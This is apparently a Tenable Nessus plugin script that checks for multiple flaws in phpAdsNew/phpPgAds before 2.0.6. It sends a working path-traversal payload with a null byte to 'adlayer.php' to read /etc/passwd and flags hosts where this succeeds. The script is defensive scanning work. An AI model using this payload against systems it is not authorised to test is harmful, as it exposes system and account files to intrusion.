#
# (C) Tenable Network Security
#


if (description) {
  script_id(19518);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2498", "CVE-2005-2635", "CVE-2005-2636");
  script_bugtraq_id(14560, 14583, 14588, 14584, 14591);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"18886");
    script_xref(name:"OSVDB", value:"18888");
    script_xref(name:"OSVDB", value:"18889");
  }

  name["english"] = "phpAdsNew / phpPgAds < 2.0.6 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running phpAdsNew / phpPgAds, an open-source banner
ad server. 

The version of phpAdsNews / phpPgAds installed on the remote host
suffers from several flaws :

  - Remote PHP Code Injection Vulnerability
    The XML-RPC library bundled with the application allows
    an attacker to inject arbitrary PHP code via the 
    'adxmlrpc.php' script to be executed within the context 
    of the affected web server user id.

  - Multiple Local File Include Vulnerabilities
    The application fails to sanitize user-supplied input to
    the 'layerstyle' parameter of the 'adlayer.php' script and
    the 'language' parameter of the 'admin/js-form.php' script
    before using them to include PHP files for execution. An
    attacker can exploit these issues to read arbitrary local
    files provided PHP's 'magic_quotes' directive is disabled.

  - SQL Injection Vulnerability
    An attacker can manipulate SQL queries via input to the 
    'clientid' parameter of the 'libraries/lib-view-direct.inc.php'
    script.

See also : 

http://www.hardened-php.net/advisory_152005.67.html
http://www.securityfocus.com/archive/1/408423/30/120/threaded

Solution : 

Upgrade to phpAdsNew / phpPgAds 2.0.6 or later.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in phpAdsNew / phpPgAds < 2.0.6";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in adlayer.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/adlayer.php?",
      "layerstyle=../../../../../../../etc/passwd%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but the other flaws
    #     would still be present.
    egrep(string:res, pattern:"Warning.+main\(.+/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Fatal error.+ Failed opening required '.+/etc/passwd")
  ) {
    security_hole(port);
    exit(0);
  }
}
